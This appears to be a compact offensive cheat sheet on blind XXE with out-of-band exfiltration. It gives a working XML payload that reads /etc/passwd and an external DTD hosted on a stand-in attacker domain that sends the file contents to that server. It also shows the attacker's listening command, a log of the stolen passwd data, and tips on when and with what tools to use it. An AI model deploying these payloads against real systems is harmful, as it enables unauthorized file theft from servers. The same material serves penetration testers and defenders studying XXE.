Blind XXE — out-of-band exfiltration

payload.xml — sent to target
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM
    "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM
    "http://attacker.tld/evil.dtd">
  %dtd;
  %send;
]>
<foo/>
evil.dtd — hosted on attacker server
<!ENTITY % all
  "<!ENTITY % send SYSTEM
   'http://attacker.tld/?d=%file;'>">
%all;
$ python3 -m http.server 80 (attacker)
target.victim - - "GET /evil.dtd HTTP/1.1" 200
target.victim - - "GET /?d=root:x:0:0:root...
                              HTTP/1.1" 200

When to use The endpoint accepts XML but doesn't echo any field back. No reflection, no error message that quotes the value.

How %file; reads the secret. %all; defines a new entity whose URL contains the secret. The parser fetches that URL — you log the request.

Tools interactsh, burp collaborator, or just python3 -m http.server on a public IP.
